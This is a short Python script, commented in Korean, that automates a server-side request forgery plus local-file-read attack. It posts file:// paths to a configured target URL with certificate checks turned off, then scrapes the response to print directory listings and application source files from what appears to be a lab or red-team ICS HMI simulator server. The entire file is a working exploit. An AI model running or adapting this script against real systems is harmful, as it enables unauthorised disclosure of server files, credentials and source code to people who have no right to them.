import requests
from bs4 import BeautifulSoup
import urllib3

#상위 config.py 접근하기 위해해
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from config import TARGET_URL


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 파일 경로 리스트 (민감 정보 위주)
paths = [
    "/home",
    "/home/bteam",
    "/home/bteam/Desktop/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/routes.py",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/__init__.py"
]


print("========== SSRF + LFI 자동화 시작 (div 기반) ==========\n")

for path in paths:
    payload = f"file://{path}"
    print(f"[+] 요청 중: {payload}")
    try:
        res = requests.post(
            TARGET_URL,
            data={"URL": payload},
            verify=False,
            timeout=5
        )

        soup = BeautifulSoup(res.text, "html.parser")
        contents = []

        # div 태그 중 overflow: auto 스타일을 가진 것
        div = soup.find("div", style=lambda s: s and "overflow: auto" in s)
        if div and div.text.strip():
            contents.append(div.text.strip())

        # p 태그 (선택적으로 추가)
        p = soup.find("p")
        if p and p.text.strip():
            contents.append(p.text.strip())

        if contents:
            print(f"[✔] {path} 내용 일부:\n" + "\n---\n".join(contents) + "\n")
        else:
            print(f"[!] {path}는 비어 있음 또는 태그 없음\n")

    except Exception as e:
        print(f"[!] 오류 발생: {e}\n")


print("========== SSRF + LFI 자동화 종료 ==========")